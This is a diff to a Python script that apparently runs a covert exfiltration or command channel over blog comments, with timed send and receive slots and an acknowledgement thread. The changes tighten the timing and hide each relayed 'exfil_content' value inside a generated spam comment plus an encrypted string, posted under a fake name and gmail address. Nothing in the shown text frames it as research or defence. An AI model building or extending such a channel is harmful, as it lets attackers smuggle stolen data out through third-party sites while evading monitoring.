@@ -7,7 +7,7 @@ import datetime
 import threading
 
 server_id = sys.argv[1]
-random.seed(int(datetime.datetime.now().timestamp()) + int(server_id))
+random.seed(int(datetime.datetime.utcnow().timestamp()) + int(server_id))
 is_debug = True if len(sys.argv) > 2 and sys.argv[2] == "-v" else False
 sender = generate_random_sender()
 
@@ -20,13 +20,13 @@ channel.ack_channel_id = get_post_id(channel.target_blog, channel.ack_channel)
 
 btm_recv_config = ReceiveConfig()
 btm_recv_config.recvr_id = server_id
-btm_recv_config.recv_time_slot = 30
+btm_recv_config.recv_time_slot = 25
 btm_recv_config.process_time_slot = 40
 btm_recv_config.prev_unapproved_index = 0
 
 mtb_send_config= SendConfig()
 mtb_send_config.sender_id = server_id
-mtb_send_config.send_time_slot = 10
+mtb_send_config.send_time_slot = 5
 mtb_send_config.confirm_time_slot = None # The master does not need to confim if its comment has been sent successfully
 
 class Client:
@@ -57,9 +57,10 @@ def thread_start_listener():
 
             comment = Comment()
             comment.sender = Sender()
-            comment.comment = exfil_content.split(":")[0]
-            comment.sender.name = comment.comment
-            comment.sender.email = comment.comment.lower() + "@gmail.com"
+            name_to_use = exfil_content.split(":")[0]
+            comment.comment = generate_random_spam_comment(0) + encrypt_decript_string(name_to_use)
+            comment.sender.name = name_to_use
+            comment.sender.email = name_to_use.lower() + "@gmail.com"
             log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received comment with ID " + comment.comment + ". Sending acknowledgement...", 1)
             response = submit_comment(channel.target_blog, channel.ack_channel_id, comment)
             log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)
